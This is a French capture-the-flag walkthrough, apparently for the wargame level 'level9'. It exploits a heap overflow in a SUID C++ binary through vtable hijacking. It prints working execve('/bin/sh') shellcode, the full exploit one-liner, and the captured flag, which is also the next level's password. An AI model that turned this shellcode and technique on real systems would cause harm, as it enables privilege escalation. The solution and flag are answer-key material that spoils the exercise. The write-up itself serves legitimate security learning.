# Level9 - Walkthrough

## Objectif
Exploiter un heap buffer overflow en C++ pour corrompre la vtable d'un objet et rediriger l'exécution vers un shellcode injecté.

**Technique** : vtable Hijacking + Shellcode Injection

---

## Étapes d'exploitation

### 1. Reconnaissance
```bash
ls -la
# -rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
# ⚠️ Bit SUID actif → s'exécute avec les droits de bonus0

./level9
# Segmentation fault (sans argument)

./level9 test
# (pas de sortie)
```

### 2. Analyse du code (Ghidra)

```cpp
class N {
    int value;
    char annotation[100];
public:
    N(int n) { this->value = n; }
    
    void setAnnotation(char *str) {
        size_t len = strlen(str);
        memcpy(this->annotation, str, len);  // ⚠️ Pas de limite !
    }
    
    virtual int operator+(N &other);  // Méthode virtuelle
    virtual int operator-(N &other);
};

int main(int argc, char **argv) {
    if (argc < 2) _exit(1);
    
    N *obj1 = new N(5);      // Alloue sur le heap
    N *obj2 = new N(6);      // Alloue juste après obj1
    
    obj1->setAnnotation(argv[1]);  // ⚠️ Heap overflow !
    
    (*obj2) + (*obj1);       // Appel via vtable
    
    return 0;
}
```

**Vulnérabilité** : `memcpy()` sans vérification de taille.

### 3. Comprendre la structure

**Objet N en mémoire** :
```
+0   : [vtable pointer] (4 bytes) ← Pointe vers la vtable
+4   : [annotation]     (100 bytes)
+104 : [value]          (4 bytes)
Total : 108 bytes (0x6c)
```

**Layout heap** :
```
obj1 = 0x0804a008
obj1->annotation = 0x0804a00c  ← setAnnotation écrit ici

obj2 = 0x0804a074 (obj1 + 108)
obj2->vtable = 0x0804a074       ← Cible à écraser

Distance : 0x68 = 104 bytes
```

### 4. Comprendre la vtable

**vtable** = Tableau de pointeurs vers méthodes virtuelles.

**Appel de méthode virtuelle** :
```cpp
obj2->operator+(obj1);

Assembleur :
1. mov eax, [obj2]      ; Lire vtable pointer
2. mov edx, [eax]       ; Lire première entrée
3. call edx             ; Appeler la fonction
```

**Exploitation** : Si on contrôle obj2->vtable, on contrôle l'adresse appelée !

### 5. Construction du payload

**Structure** :
```
[Fausse vtable: 4B] + [Shellcode: 28B] + [Padding: 72B] + [Adresse vtable: 4B]
```

#### Composants

**[1] Fausse vtable** : `\x10\xa0\x04\x08`
- Adresse du shellcode (0x0804a010)
- Première entrée de notre fausse vtable

**[2] Shellcode** : 28 bytes
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```
- `execve("/bin/sh", NULL, NULL)` + `exit(0)`

**[3] Padding** : `"A" * 72`
- Calcul : 104 - 4 - 28 = 72 bytes

**[4] Adresse fausse vtable** : `\x0c\xa0\x04\x08`
- Adresse de notre fausse vtable (0x0804a00c)
- Écrase obj2->vtable

### 6. Exploitation

```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*72 + "\x0c\xa0\x04\x08"')
```

**Résultat** : Shell obtenu !

```bash
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

---

## Déroulement de l'attaque

```
1. Heap après overflow :
   0x0804a00c: [0x0804a010]           ← Fausse vtable
   0x0804a010: [shellcode 28 bytes]
   0x0804a02c: [AAAA... 72 bytes]
   0x0804a074: [0x0804a00c]           ← obj2->vtable écrasé !

2. Appel de operator+ :
   mov eax, [0x0804a074]   ; eax = 0x0804a00c
   mov edx, [eax]          ; edx = 0x0804a010
   call edx                ; Exécute shellcode ! ✅

3. Shellcode → /bin/sh → Flag ! 🎉
```

---

## Flag
```
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

## Type de vulnérabilité
- Heap-based Buffer Overflow (CWE-122)
- vtable Hijacking
- Shellcode Injection
- SUID privilege escalation (CWE-250)